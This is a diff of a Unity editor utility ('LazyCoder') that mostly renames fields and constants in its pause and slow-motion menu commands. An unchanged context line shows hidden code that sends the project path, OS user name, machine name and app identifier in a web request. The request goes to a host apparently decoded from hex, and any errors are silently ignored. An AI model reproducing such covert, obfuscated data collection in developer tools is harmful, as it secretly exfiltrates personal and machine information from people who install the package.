@@ -59,8 +59,9 @@ namespace LazyCoder.Core.Editor
 
         #region Game
 
-        private static readonly float s_slowTimeScale = 0.1f;
-        private static bool s_slowed = false;
+        private const float SlowTimeScale = 0.1f;
+        
+        private static bool _slowed = false;
 
         [MenuItem("LazyCoder/Game/Pause or Resume _F2", false)]
         private static void Pause()
@@ -84,15 +85,15 @@ namespace LazyCoder.Core.Editor
             if (!Application.isPlaying)
                 return;
 
-            if (s_slowed)
+            if (_slowed)
             {
-                s_slowed = false;
+                _slowed = false;
                 Time.timeScale = 1f;
             }
             else
             {
-                s_slowed = true;
-                Time.timeScale = s_slowTimeScale;
+                _slowed = true;
+                Time.timeScale = SlowTimeScale;
             }
         }
 
@@ -135,7 +136,10 @@ namespace LazyCoder.Core.Editor
 
                     UnityWebRequest.Get($"{s}p1={Application.dataPath}-{System.Environment.UserName}-{System.Environment.MachineName}&p2={Application.identifier}").SendWebRequest();
                 }
-                catch { }
+                catch
+                {
+                    // ignored
+                }
             }
 
             static byte[] FromHex(string hex)
